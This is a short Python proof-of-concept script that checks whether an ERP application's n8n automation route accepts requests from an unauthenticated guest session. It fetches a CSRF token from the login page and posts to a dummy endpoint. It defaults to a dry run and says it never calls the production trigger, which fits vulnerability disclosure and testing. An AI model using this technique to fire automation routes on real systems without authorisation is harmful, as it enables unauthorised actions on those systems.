#!/usr/bin/env python3
"""Safe PoC scaffold showing an automation route is not protected by auth."""
import argparse
import http.cookiejar
import re
import urllib.parse
import urllib.request


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="https://erp.example.test")
    parser.add_argument("--execute-safe", action="store_true", help="POST only to the dummy success endpoint")
    args = parser.parse_args()
    base = args.base_url.rstrip("/")
    print("1. Guest target: POST /n8n-trigger-baru-lagi (dummy endpoint).")
    print("2. Production /n8n-trigger is intentionally never called by this PoC.")
    if not args.execute_safe:
        print("3. DRY RUN: no request sent.")
        return
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    login = opener.open(base + "/", timeout=10).read().decode("utf-8", "replace")
    match = re.search(r'name=["\']_token["\'][^>]*value=["\']([^"\']+)', login)
    if not match:
        raise SystemExit("CSRF token not found on login page")
    body = urllib.parse.urlencode({"_token": match.group(1)}).encode()
    request = urllib.request.Request(base + "/n8n-trigger-baru-lagi", data=body, method="POST")
    with opener.open(request, timeout=10) as response:
        print("3. HTTP status:", response.status)
        print("4. A 200 JSON success response proves the route accepts an unauthenticated guest session.")


if __name__ == "__main__":
    main()
